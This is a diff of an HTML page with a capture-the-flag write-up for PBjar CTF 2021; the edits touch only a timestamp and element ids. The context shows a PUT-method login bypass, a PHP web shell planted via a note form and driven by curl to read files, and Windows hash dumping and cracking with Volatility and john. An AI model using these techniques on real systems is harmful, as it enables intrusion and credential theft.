@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2025-01-21 Tue 19:16 -->
+<!-- 2025-01-21 Tue 21:22 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PBjar ctf 2021</title>
@@ -89,7 +89,7 @@ The description gave us the user name <code>admin</code>, supplying the password
 <p>
 So if we change the request type from <code>POST</code> to <code>PUT</code>, and send the data in the body:<br>
 </p>
-<pre class="example" id="orga3e471b">
+<pre class="example" id="orgab9b757">
 PUT /index.php HTTP/1.1
 Host: 147.182.172.217:42003
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -107,7 +107,7 @@ username=admin&amp;password=admin
 </pre>
 
 
-<figure id="org7b50050">
+<figure id="org654e79d">
 <img src="assets/2021-09-18_15-59-34_screenshot.png" alt="2021-09-18_15-59-34_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>And we got the flag!</figcaption>
@@ -116,7 +116,7 @@ username=admin&amp;password=admin
 <p>
 This can also be done quite easily with(as the challenge name implies), <code>curl</code>:<br>
 </p>
-<pre class="example" id="org8388e85">
+<pre class="example" id="org6832fd3">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl -X PUT "http://147.182.172.217:42003/index.php" -d "username=admin&amp;password=admin"
 
@@ -190,7 +190,7 @@ This however doesn't stop us from simply inserting an ekstra set of bad characte
 <p>
 So in burp suite I edited the <code>POST</code> request to create a simple PHP shell:<br>
 </p>
-<pre class="example" id="orga33efa7">
+<pre class="example" id="org6de20b2">
 POST /addnote.php HTTP/1.1
 Host: 147.182.172.217:42002
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -219,7 +219,7 @@ echo "&lt;/pre&gt;";?&gt;
 <p>
 Then just run the following <code>curl</code> command on the newly created note:<br>
 </p>
-<pre class="example" id="orge8d24c8">
+<pre class="example" id="orgf88a90d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl "http://147.182.172.217:42002/c0N8GENVYy1EwaR.php?cmd=cat%20../../../flag.php"
 Ran: cat ../../../flag.php | Ret: 0
@@ -279,7 +279,7 @@ The compared to the previous challenge, there is an extra <code>str_replace_firt
 <p>
 And looking at the added <code>str_replace</code> calls, I figured that I could basically use the same PHP shell and add an extra "&lt;?".<br>
 </p>
-<pre class="example" id="org1d44dbd">
+<pre class="example" id="org90cc199">
 POST /addnote.php HTTP/1.1
 Host: 147.182.172.217:42007
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -308,7 +308,7 @@ echo "&lt;/pre&gt;";?&gt;
 <p>
 And run the following <code>curl</code> command on the new note:<br>
 </p>
-<pre class="example" id="org538a91d">
+<pre class="example" id="org3182254">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl "http://147.182.172.217:42007/kuvQDsVlC0ybArZ.php?cmd=cat%20../../../flag.php"
 Ran: cat ../../../flag.php | Ret: 0
@@ -369,7 +369,7 @@ flag{wA1t_a_m1nUt3_
 
 
 
-<figure id="org4efdd1e">
+<figure id="org3770b7a">
 <img src="assets/2021-09-21_09-15-53_screenshot.png" alt="2021-09-21_09-15-53_screenshot.png"><br>
 
 </figure>
@@ -396,7 +396,7 @@ Convert the hexvalue in <a href="convert/file.txt">convert/file.txt</a> to ascii
 <p>
 This can quickly be done using <code>xxd</code>:<br>
 </p>
-<pre class="example" id="orgbf1d920">
+<pre class="example" id="org8fc0271">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/convert ]
 └─&gt; $ cat convert/file.txt | xxd -r -p
 flag{dis_is_a_fl4ggg_h1}%
@@ -414,7 +414,7 @@ This binary would print a lot of text containing fake flags, an just one real fl
 <p>
 To find the real flag I ran <code>strings</code> on the binary and chained a couple of <code>grep</code> calls togehter:<br>
 </p>
-<pre class="example" id="org29a7f48">
+<pre class="example" id="org594d221">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/polymer ]
 └─&gt; $ strings polymer | grep -o -E "flag\{[a-zA-Z0-9_]+\}" | grep -v "flag{n0t_th3_fl4g_l0l}"
 flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}
@@ -486,7 +486,7 @@ Now all we need to do run the following command:<br>
 And grab a cup of coffe while we wait.<br>
 Once the script is done, we can look in the <code>output</code> file and we got the flag:<br>
 </p>
-<pre class="example" id="org3172228">
+<pre class="example" id="orga6672cc">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/stegosaurus ]
 └─&gt; $ cat output.txt                                   
 flag{ungulatus_better_than_stenops}
@@ -517,7 +517,7 @@ I also added a filter, to eliminate unwanted data.<br>
 <p>
 Then I exported to csv:<br>
 </p>
-<pre class="example" id="org5e1a5bb">
+<pre class="example" id="org90525fb">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ head extracted_info_2.csv                                                         15:16
 "No.","Time","Source","Port","Destination","Port","Protocol","Length","Keys","Info"
@@ -548,7 +548,7 @@ python key_extractor.py &gt; characters.txt
 </pre>
 
 
-<pre class="example" id="orgcd1bb50">
+<pre class="example" id="orgde7becd">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ cat characters.txt                                                                15:31
 No map found for this value: 55
@@ -575,7 +575,7 @@ I didn't finish as after doing the same thing time and time again, I was suddenl
 <p>
 Resulting in me skipping to the end where I found the flag:<br>
 </p>
-<pre class="example" id="org6aadaed">
+<pre class="example" id="org86dd36c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ cat char_log.txt                                                                  15:37
 RET sudo SPC apt-get SPC update RET user RET
@@ -616,7 +616,7 @@ When doing forensics on this type of file, a popular tool to use is <code>volati
 <p>
 Let us first get some information about the system, i'll start with the plugin <code>banners.Banners</code>, which find linux related banners:<br>
 </p>
-<pre class="example" id="org7edd2d4">
+<pre class="example" id="org24f12da">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem banners.Banners                      
 Volatility 3 Framework 1.0.1
@@ -629,7 +629,7 @@ Offset  Banner
 <p>
 Not much to see here, so it probably runs Windows, but let's use the <code>windows.info.Info</code> plugin:<br>
 </p>
-<pre class="example" id="org519bb03">
+<pre class="example" id="org9beef3c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem windows.info.Info                  
 Volatility 3 Framework 1.0.1
@@ -664,7 +664,7 @@ PE TimeDateStamp        Sun Apr 13 18:31:06 2008
 Bingo!<br>
 Now that I know the OS of the image, i'll dump the hashes using <code>windows.hashdump.Hashdump</code>:<br>
 </p>
-<pre class="example" id="orgab1bd94">
+<pre class="example" id="org760e754">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem windows.hashdump.Hashdump                           11:39
 Volatility 3 Framework 1.0.1
@@ -681,7 +681,7 @@ SUPPORT_388945a0        1002    aad3b435b51404eeaad3b435b51404ee        9546430b
 <p>
 I then took these hashes, put them into a file and formatted it to match <code>john</code> format for cracking:<br>
 </p>
-<pre class="example" id="orga600b6b">
+<pre class="example" id="org682ee79">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ cat hashes.txt                                                                    11:46
 Administrator:31a5167ba5ce8351b0110a9d13636cd9
@@ -693,7 +693,7 @@ SUPPORT_388945a0:9546430bd8979312c16cb95d28bfc853
 <p>
 Then I used <code>john</code> with the wordlist <code>rockyou.txt</code>, hoping that it would contain the right password:<br>
 </p>
-<pre class="example" id="orge300dd4">
+<pre class="example" id="org2dbbb32">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ john --rules=all --wordlist=$REPOS/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=NT hashes.txt
 --------------------------------------------------------------------------
@@ -742,7 +742,7 @@ Which more or less means that it is a suspended virtual machine.<br>
 I started of the same way as <a href="#org875259d">memedium</a>, with trying to identify the OS.<br>
 Altough I had some problems using <code>volatility3</code> on this challenge, so I used <code>volatility2</code> instead.<br>
 </p>
-<pre class="example" id="org111b236">
+<pre class="example" id="org449e599">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss imageinfo                                        12:10
 Volatility Foundation Volatility Framework 2.6.1
@@ -766,7 +766,7 @@ INFO    : volatility.debug    : Determining profile based on KDBG search...
 <p>
 Now that I know the profile, I'll list the processes running:<br>
 </p>
-<pre class="example" id="orgce28555">
+<pre class="example" id="orgdf1223b">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss --profile=Win7SP1x86_23418 pslist                12:11
 Volatility Foundation Volatility Framework 2.6.1
@@ -821,7 +821,7 @@ Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Star
 Since we want the email of the attacker, a good bet would be to look at the memory of the outlook process.<br>
 This can be dumped using the <code>memdump</code> plugin, with the <code>PID</code> of the outlook  process.<br>
 </p>
-<pre class="example" id="orgd775adf">
+<pre class="example" id="org4129c04">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss --profile=Win7SP1x86_23418 memdump -p 3196 -D .  12:21
 Volatility Foundation Volatility Framework 2.6.1
@@ -832,7 +832,7 @@ Writing OUTLOOK.EXE [  3196] to 3196.dmp
 <p>
 Now we can use <code>strings</code> in a combination with <code>grep</code> to search for what we want:<br>
 </p>
-<pre class="example" id="orgf1e12ce">
+<pre class="example" id="orgc11b2c9">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ strings 3196.dmp | grep -E "([a-zA-Z0-9_]\w+)@([a-zA-Z0-9_]\w+)\.([a-zA-Z0-9_]\w+)" | grep -v "allsafecybersec" 
 SMTP:TH3WH1T3R0S3@GMAIL.COM
